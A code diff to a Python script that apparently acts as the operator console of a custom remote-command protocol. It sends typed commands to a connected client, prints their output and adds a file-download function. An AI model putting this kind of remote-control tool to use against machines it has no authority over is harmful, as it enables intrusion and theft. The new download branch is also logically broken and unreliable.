@@ -9,27 +9,38 @@ def run():
     while True:
         req = STP.ReceiveStone()
 
-        if req.header.StoneType == struct.pack("I", 1):
-            print(req.payload.command_output.decode("cp949"))
+        if req.header.StoneType == struct.pack("I", 3):
+            print(req.payload.response.decode("cp949"))
 
         stone = input("Send command: ")
 
-        if stone == "close":
-            STP.SendStone(generator().stone)
-            if STP.ReceiveStone().header.StoneType == struct.pack("I", 4):
+        if stone == "exit":
+            STP.SendStone(disconnect().stone)
+            if STP.ReceiveStone().header.StoneType == struct.pack("I", 5):
                 print("Client has disconnected.")
                 break
-
-        res = generator("sys_info",stone)
-
-        STP.SendStone(res.stone)
-
+            
+        elif stone in "download":
+            STP.SendStone(handle_download(stone.split(" ")[0]).stone)
+            
+        else:
+            STP.SendStone(handle_command(stone).stone)
 
     STP.Disconnect()
     
-def generator(sys_info="", input= "", output= ""):
-    SSP = ConstructStonePayload.from_(StructRawStonePayload(sys_info, input, output, ""))
+def handle_command(input= ""):
+    SSP = ConstructStonePayload.from_(StructRawStonePayload("sys_info", input, "", ""))
     SSH = ConstructStoneHeader.from_(SSP)
+    return ConstructStone.from_(SSH, SSP)
+
+def disconnect():
+    SSP = ConstructStonePayload.from_(StructRawStonePayload("", "", "", ""))
+    SSH = ConstructStoneHeader.from_(SSP)
+    return ConstructStone.from_(SSH, SSP)
+
+def handle_download(path):
+    SSP = ConstructStonePayload.from_(StructRawStonePayload("sys_info", "", "", path))
+    SSH = ConstructStoneHeader.upload(SSP)
     return ConstructStone.from_(SSH, SSP)
 
 run()
